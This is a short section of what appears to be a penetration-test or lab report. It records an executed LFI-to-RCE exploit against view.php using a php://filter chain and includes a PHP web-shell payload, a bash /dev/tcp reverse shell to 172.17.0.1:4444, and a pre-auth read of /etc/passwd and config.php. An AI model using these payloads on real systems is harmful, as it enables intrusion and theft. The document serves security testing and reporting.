5. EXPLOITATION (executed)
-------------------------------------------------------------------------------
LFI -> RCE  [exploits/lfi_rce.py]
  view.php include() of user input + allow_url_include=Off -> php://filter chain
  emits payload, include() executes it. disable_functions empty -> system() works.
  Payload: \n<?php system($_GET[0]); die; ?>   (long tag needed; short tag gave
  "unexpected character 0x06" parse error due to leading noise byte).
  Confirmed:  HTTP 200 -> uid=33(www-data) gid=33(www-data)
  Reverse shell: bash /dev/tcp/172.17.0.1/4444 -> interactive shell as www-data.
  NOTE: chain ~6.5KB, under Apache LimitRequestLine (~8KB). OK.

Arbitrary file read  [exploits/lfi_read.py]
  Pre-auth read of /etc/passwd, config.php and all PHP sources via php://filter.
